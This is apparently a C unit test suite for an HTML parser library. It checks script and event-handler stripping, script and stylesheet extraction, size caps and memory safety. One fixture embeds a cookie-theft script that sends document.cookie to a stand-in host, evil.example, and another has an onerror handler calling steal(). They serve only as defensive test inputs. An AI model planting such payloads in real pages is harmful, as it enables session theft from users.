/*
 * TDD suite for html_parse (Hito 2).
 *
 * RED state: there is no src/html_parse.c yet, so this fails to link on purpose.
 *
 * Build: make test   (requires libcmocka-dev and liblexbor-dev)
 * ASan:  make asan
 */

#include <stdarg.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <setjmp.h>
#include <string.h>
#include <cmocka.h>

#include "html_parse.h"

#define LIT(s) (s), (sizeof(s) - 1)

static const char DOC_SIMPLE[] =
    "<!DOCTYPE html><html><head><title>Hello Title</title></head>"
    "<body><p>Hello World</p></body></html>";

static const char DOC_SCRIPT[] =
    "<html><body><p>visible</p>"
    "<script>document.location='http://evil.example/'+document.cookie;</script>"
    "</body></html>";

static const char DOC_HANDLER[] =
    "<html><body><img src=x onerror=\"steal()\"><a href=# onclick=\"x()\">k</a></body></html>";

/* --- config / validator --- */

static void test_config_default_is_secure(void **state) {
    (void)state;
    hp_config c = hp_config_default();
    assert_int_equal((unsigned long)c.max_bytes, (unsigned long)HP_DEFAULT_MAX_BYTES);
    assert_int_not_equal(c.strip_scripts, 0);
    assert_int_not_equal(c.strip_event_handlers, 0);
}

static void test_validate_rejects_null(void **state) {
    (void)state;
    hp_config c = hp_config_default();
    assert_int_equal(hp_validate_input(NULL, 10, &c), HP_ERR_NULL_ARG);
}

static void test_validate_rejects_empty(void **state) {
    (void)state;
    hp_config c = hp_config_default();
    assert_int_equal(hp_validate_input("x", 0, &c), HP_ERR_EMPTY);
}

static void test_validate_rejects_oversize(void **state) {
    (void)state;
    hp_config c = hp_config_default();
    c.max_bytes = 8;
    assert_int_equal(hp_validate_input("123456789", 9, &c), HP_ERR_TOO_LARGE);
}

static void test_validate_accepts_within_cap(void **state) {
    (void)state;
    hp_config c = hp_config_default();
    assert_int_equal(hp_validate_input(LIT(DOC_SIMPLE), &c), HP_OK);
}

/* --- parse: argument guards --- */

static void test_parse_rejects_null_args(void **state) {
    (void)state;
    hp_config c = hp_config_default();
    hp_document *doc = NULL;
    assert_int_equal(hp_parse(NULL, 5, &c, &doc), HP_ERR_NULL_ARG);
    assert_int_equal(hp_parse("x", 1, &c, NULL), HP_ERR_NULL_ARG);
}

static void test_parse_rejects_oversize(void **state) {
    (void)state;
    hp_config c = hp_config_default();
    c.max_bytes = 4;
    hp_document *doc = NULL;
    assert_int_equal(hp_parse(LIT(DOC_SIMPLE), &c, &doc), HP_ERR_TOO_LARGE);
    assert_null(doc);
}

/* --- parse: structure & extraction --- */

static void test_parse_simple_document(void **state) {
    (void)state;
    hp_config c = hp_config_default();
    hp_document *doc = NULL;
    assert_int_equal(hp_parse(LIT(DOC_SIMPLE), &c, &doc), HP_OK);
    assert_non_null(doc);
    assert_true(hp_element_count(doc) > 0);

    size_t tlen = 0;
    char *title = hp_get_title(doc, &tlen);
    assert_non_null(title);
    assert_string_equal(title, "Hello Title");
    hp_free(title);

    size_t blen = 0;
    char *text = hp_extract_text(doc, &blen);
    assert_non_null(text);
    assert_non_null(strstr(text, "Hello World"));
    hp_free(text);

    hp_document_free(doc);
}

/* --- script isolation (core Hito 2 guarantee) --- */

static void test_scripts_stripped_by_default(void **state) {
    (void)state;
    hp_config c = hp_config_default();
    hp_document *doc = NULL;
    assert_int_equal(hp_parse(LIT(DOC_SCRIPT), &c, &doc), HP_OK);
    assert_int_equal((unsigned long)hp_script_count(doc), 0UL);

    char *text = hp_extract_text(doc, NULL);
    assert_non_null(text);
    assert_null(strstr(text, "document.cookie")); /* script body must be gone */
    assert_non_null(strstr(text, "visible"));     /* real content survives */
    hp_free(text);
    hp_document_free(doc);
}

static void test_scripts_kept_when_disabled(void **state) {
    (void)state;
    hp_config c = hp_config_default();
    c.strip_scripts = 0;
    hp_document *doc = NULL;
    assert_int_equal(hp_parse(LIT(DOC_SCRIPT), &c, &doc), HP_OK);
    assert_true(hp_script_count(doc) >= 1);
    hp_document_free(doc);
}

static void test_event_handlers_stripped_by_default(void **state) {
    (void)state;
    hp_config c = hp_config_default();
    hp_document *doc = NULL;
    assert_int_equal(hp_parse(LIT(DOC_HANDLER), &c, &doc), HP_OK);
    assert_int_equal((unsigned long)hp_event_handler_count(doc), 0UL);
    hp_document_free(doc);
}

static void test_event_handlers_kept_when_disabled(void **state) {
    (void)state;
    hp_config c = hp_config_default();
    c.strip_event_handlers = 0;
    hp_document *doc = NULL;
    assert_int_equal(hp_parse(LIT(DOC_HANDLER), &c, &doc), HP_OK);
    assert_true(hp_event_handler_count(doc) >= 2);
    hp_document_free(doc);
}

/* --- per-script extraction (browsers run each <script> as its own program) --- */

/* Two inline scripts come back as two SEPARATE entries (not concatenated), in
 * document order, each its own NUL-terminated buffer; an external src script is a
 * THIRD entry carrying its raw src (never fetched here). A JSON data block is
 * excluded. This separation is what lets the worker isolate an error in one script
 * from the next and interleave external execution in document order. */
static void test_extract_script_list_separates(void **state) {
    (void)state;
    static const char H[] =
        "<html><body>"
        "<script>var a=1;</script>"
        "<script src='https://x.example/app.js'></script>" /* external: listed w/ src */
        "<script type='application/ld+json'>{\"k\":1}</script>" /* data: excluded */
        "<script>var b=2;</script>"
        "</body></html>";
    hp_config c = hp_config_default();
    c.strip_scripts = 0;
    hp_document *doc = NULL;
    assert_int_equal(hp_parse(LIT(H), &c, &doc), HP_OK);

    size_t n = 0;
    hp_script *s = hp_extract_script_list(doc, &n);
    assert_non_null(s);
    assert_int_equal((unsigned long)n, 3UL);   /* two inline + the external, in order */
    assert_int_equal((unsigned long)s[0].len, strlen("var a=1;"));
    assert_string_equal(s[0].text, "var a=1;");          /* document order preserved */
    assert_null(s[0].src);
    assert_null(s[1].text);                              /* external: src only */
    assert_string_equal(s[1].src, "https://x.example/app.js");
    assert_string_equal(s[2].text, "var b=2;");
    assert_null(s[2].src);
    hp_free_scripts(s, n);
    hp_document_free(doc);
}

/* External-script semantics (Hito 24 EXT): a <script src> with an inline body lists
 * ONLY the src (browser rule: when src is present the content is ignored); module
 * scripts (type containing "module") are excluded entirely, inline or external
 * (import/export cannot run as a classic script -- fail closed). */
static void test_extract_script_list_external_semantics(void **state) {
    (void)state;
    static const char H[] =
        "<html><body>"
        "<script src='https://cdn.example/a.js'>var ignored=1;</script>"
        "<script type='module' src='https://cdn.example/m.js'></script>"
        "<script type='module'>import x from 'y';</script>"
        "</body></html>";
    hp_config c = hp_config_default();
    c.strip_scripts = 0;
    hp_document *doc = NULL;
    assert_int_equal(hp_parse(LIT(H), &c, &doc), HP_OK);

    size_t n = 0;
    hp_script *s = hp_extract_script_list(doc, &n);
    assert_non_null(s);
    assert_int_equal((unsigned long)n, 1UL);   /* only the classic external survives */
    assert_null(s[0].text);                    /* inline body ignored when src set */
    assert_string_equal(s[0].src, "https://cdn.example/a.js");
    hp_free_scripts(s, n);
    hp_document_free(doc);
}

/* A classic script runs only when its type is absent/empty or a JavaScript MIME
 * type. Template/data blocks (text/x-jquery-tmpl, text/html, text/template) are
 * NOT executed -- running them throws a SyntaxError on their markup (Slashdot's
 * "#each" errors). Fail closed: only a recognized JS type survives. */
static void test_extract_script_list_skips_non_js_type(void **state) {
    (void)state;
    static const char H[] =
        "<html><body>"
        "<script>var a=1;</script>"                              /* no type: runs */
        "<script type='text/javascript'>var b=2;</script>"       /* JS type: runs */
        "<script type='application/javascript'>var c=3;</script>"/* JS type: runs */
        "<script type='text/x-jquery-tmpl'>{{each items}}x{{/each}}</script>" /* template: skip */
        "<script type='text/html'><li>tpl</li></script>"         /* template: skip */
        "<script type='text/template'>{{name}}</script>"         /* template: skip */
        "<script type='text/babel'>var d=4;</script>"            /* needs transpile: skip */
        "</body></html>";
    hp_config c = hp_config_default();
    c.strip_scripts = 0;
    hp_document *doc = NULL;
    assert_int_equal(hp_parse(LIT(H), &c, &doc), HP_OK);

    size_t n = 0;
    hp_script *s = hp_extract_script_list(doc, &n);
    assert_non_null(s);
    assert_int_equal((unsigned long)n, 3UL);   /* only the three JS scripts, in order */
    assert_string_equal(s[0].text, "var a=1;");
    assert_string_equal(s[1].text, "var b=2;");
    assert_string_equal(s[2].text, "var c=3;");
    hp_free_scripts(s, n);
    hp_document_free(doc);
}

/* No inline scripts => NULL list and zero count (never a bogus empty buffer). */
static void test_extract_script_list_empty(void **state) {
    (void)state;
    hp_config c = hp_config_default();
    c.strip_scripts = 0;
    hp_document *doc = NULL;
    assert_int_equal(hp_parse(LIT("<html><body><p>hi</p></body></html>"), &c, &doc), HP_OK);
    size_t n = 123;
    hp_script *s = hp_extract_script_list(doc, &n);
    assert_null(s);
    assert_int_equal((unsigned long)n, 0UL);
    hp_document_free(doc);
    hp_free_scripts(NULL, 0); /* idempotent on NULL */
}

/* Fail-closed anti-DoS: a document with more inline scripts than HP_MAX_SCRIPTS
 * returns at most the cap (the excess is dropped, never executed). */
static void test_extract_script_list_caps(void **state) {
    (void)state;
    /* Build HP_MAX_SCRIPTS + 50 trivial scripts. */
    const size_t extra = 50;
    const size_t total = HP_MAX_SCRIPTS + extra;
    size_t buflen = total * (sizeof("<script>;</script>") - 1) + 64;
    char *html = (char *)malloc(buflen);
    assert_non_null(html);
    size_t off = 0;
    for (size_t i = 0; i < total; i++)
        off += (size_t)snprintf(html + off, buflen - off, "<script>;</script>");
    hp_config c = hp_config_default();
    c.strip_scripts = 0;
    hp_document *doc = NULL;
    assert_int_equal(hp_parse(html, off, &c, &doc), HP_OK);
    size_t n = 0;
    hp_script *s = hp_extract_script_list(doc, &n);
    assert_non_null(s);
    assert_int_equal((unsigned long)n, (unsigned long)HP_MAX_SCRIPTS);
    hp_free_scripts(s, n);
    hp_document_free(doc);
    free(html);
}

/* --- external stylesheet extraction (Hito 27: parser reports, never fetches) --- */

/* Two applicable <link rel=stylesheet> come back as their RAW hrefs in document
 * order; noise (rel=icon, link without href, a <style> element) is skipped. */
static void test_extract_stylesheets_basic(void **state) {
    (void)state;
    static const char H[] =
        "<html><head>"
        "<link rel='stylesheet' href='news.css'>"
        "<link rel='icon' href='favicon.ico'>"
        "<link rel='stylesheet'>"                      /* no href: skipped */
        "<style>p{color:red}</style>"
        "<link rel='stylesheet' href='https://x.example/a.css'>"
        "</head><body><p>hi</p></body></html>";
    hp_config c = hp_config_default();
    hp_document *doc = NULL;
    assert_int_equal(hp_parse(LIT(H), &c, &doc), HP_OK);
    size_t n = 0;
    char **s = hp_extract_stylesheet_hrefs(doc, &n);
    assert_non_null(s);
    assert_int_equal((unsigned long)n, 2UL);
    assert_string_equal(s[0], "news.css");             /* raw, unresolved */
    assert_string_equal(s[1], "https://x.example/a.css");
    hp_free_stylesheet_hrefs(s, n);
    hp_document_free(doc);
}

/* rel matches by whitespace-separated token, case-insensitively: "STYLESHEET"
 * applies; "alternate stylesheet" is an inactive alternate sheet (skipped,
 * fail-closed); a rel merely CONTAINING the word inside a longer token does not
 * match. */
static void test_extract_stylesheets_rel_tokens(void **state) {
    (void)state;
    static const char H[] =
        "<html><head>"
        "<link rel='STYLESHEET' href='upper.css'>"
        "<link rel='alternate stylesheet' href='alt.css' title='alt'>"
        "<link rel='notstylesheet' href='fake.css'>"
        "<link rel='preload stylesheet' href='multi.css'>"
        "</head></html>";
    hp_config c = hp_config_default();
    hp_document *doc = NULL;
    assert_int_equal(hp_parse(LIT(H), &c, &doc), HP_OK);
    size_t n = 0;
    char **s = hp_extract_stylesheet_hrefs(doc, &n);
    assert_non_null(s);
    assert_int_equal((unsigned long)n, 2UL);
    assert_string_equal(s[0], "upper.css");
    assert_string_equal(s[1], "multi.css");
    hp_free_stylesheet_hrefs(s, n);
    hp_document_free(doc);
}

/* media gate, fail-closed: absent/empty or containing "screen"/"all" applies;
 * anything else (print, unknown queries) is skipped. */
static void test_extract_stylesheets_media_gate(void **state) {
    (void)state;
    static const char H[] =
        "<html><head>"
        "<link rel='stylesheet' href='base.css'>"
        "<link rel='stylesheet' href='print.css' media='print'>"
        "<link rel='stylesheet' href='scr.css' media='only screen and (max-width:600px)'>"
        "<link rel='stylesheet' href='all.css' media='ALL'>"
        "<link rel='stylesheet' href='odd.css' media='(min-width: 800px)'>"
        "</head></html>";
    hp_config c = hp_config_default();
    hp_document *doc = NULL;
    assert_int_equal(hp_parse(LIT(H), &c, &doc), HP_OK);
    size_t n = 0;
    char **s = hp_extract_stylesheet_hrefs(doc, &n);
    assert_non_null(s);
    assert_int_equal((unsigned long)n, 3UL);
    assert_string_equal(s[0], "base.css");
    assert_string_equal(s[1], "scr.css");
    assert_string_equal(s[2], "all.css");
    hp_free_stylesheet_hrefs(s, n);
    hp_document_free(doc);
}

/* No applicable links => NULL with count 0; NULL doc likewise; the releaser is
 * idempotent on NULL. */
static void test_extract_stylesheets_none_and_null(void **state) {
    (void)state;
    hp_config c = hp_config_default();
    hp_document *doc = NULL;
    assert_int_equal(hp_parse(LIT("<html><body><p>hi</p></body></html>"), &c, &doc), HP_OK);
    size_t n = 123;
    char **s = hp_extract_stylesheet_hrefs(doc, &n);
    assert_null(s);
    assert_int_equal((unsigned long)n, 0UL);
    hp_document_free(doc);
    n = 123;
    assert_null(hp_extract_stylesheet_hrefs(NULL, &n));
    assert_int_equal((unsigned long)n, 0UL);
    hp_free_stylesheet_hrefs(NULL, 0);
}

/* Fail-closed anti-DoS: more links than HP_MAX_STYLESHEETS returns the cap. */
static void test_extract_stylesheets_caps(void **state) {
    (void)state;
    const size_t total = HP_MAX_STYLESHEETS + 10;
    const char one[] = "<link rel=stylesheet href=a.css>";
    size_t buflen = total * (sizeof one - 1) + 64;
    char *html = (char *)malloc(buflen);
    assert_non_null(html);
    size_t off = 0;
    for (size_t i = 0; i < total; i++)
        off += (size_t)snprintf(html + off, buflen - off, "%s", one);
    hp_config c = hp_config_default();
    hp_document *doc = NULL;
    assert_int_equal(hp_parse(html, off, &c, &doc), HP_OK);
    size_t n = 0;
    char **s = hp_extract_stylesheet_hrefs(doc, &n);
    assert_non_null(s);
    assert_int_equal((unsigned long)n, (unsigned long)HP_MAX_STYLESHEETS);
    hp_free_stylesheet_hrefs(s, n);
    hp_document_free(doc);
    free(html);
}

/* --- robustness --- */

static void test_parse_malformed_does_not_crash(void **state) {
    (void)state;
    hp_config c = hp_config_default();
    hp_document *doc = NULL;
    static const char junk[] = "<div><span><<<>>>\x01\x02 unclosed <b><i>";
    assert_int_equal(hp_parse(junk, sizeof(junk) - 1, &c, &doc), HP_OK);
    assert_non_null(doc);
    hp_document_free(doc);
}

/* --- memory safety --- */

static void test_free_null_and_double(void **state) {
    (void)state;
    hp_document_free(NULL);
    hp_free(NULL);
    hp_config c = hp_config_default();
    hp_document *doc = NULL;
    assert_int_equal(hp_parse(LIT(DOC_SIMPLE), &c, &doc), HP_OK);
    hp_document_free(doc); /* freeing once is enough; NULL-safety covered above */
}

int main(void) {
    const struct CMUnitTest tests[] = {
        cmocka_unit_test(test_config_default_is_secure),
        cmocka_unit_test(test_validate_rejects_null),
        cmocka_unit_test(test_validate_rejects_empty),
        cmocka_unit_test(test_validate_rejects_oversize),
        cmocka_unit_test(test_validate_accepts_within_cap),
        cmocka_unit_test(test_parse_rejects_null_args),
        cmocka_unit_test(test_parse_rejects_oversize),
        cmocka_unit_test(test_parse_simple_document),
        cmocka_unit_test(test_scripts_stripped_by_default),
        cmocka_unit_test(test_scripts_kept_when_disabled),
        cmocka_unit_test(test_extract_script_list_separates),
        cmocka_unit_test(test_extract_script_list_external_semantics),
        cmocka_unit_test(test_extract_script_list_skips_non_js_type),
        cmocka_unit_test(test_extract_script_list_empty),
        cmocka_unit_test(test_extract_script_list_caps),
        cmocka_unit_test(test_extract_stylesheets_basic),
        cmocka_unit_test(test_extract_stylesheets_rel_tokens),
        cmocka_unit_test(test_extract_stylesheets_media_gate),
        cmocka_unit_test(test_extract_stylesheets_none_and_null),
        cmocka_unit_test(test_extract_stylesheets_caps),
        cmocka_unit_test(test_event_handlers_stripped_by_default),
        cmocka_unit_test(test_event_handlers_kept_when_disabled),
        cmocka_unit_test(test_parse_malformed_does_not_crash),
        cmocka_unit_test(test_free_null_and_double),
    };
    return cmocka_run_group_tests(tests, NULL, NULL);
}
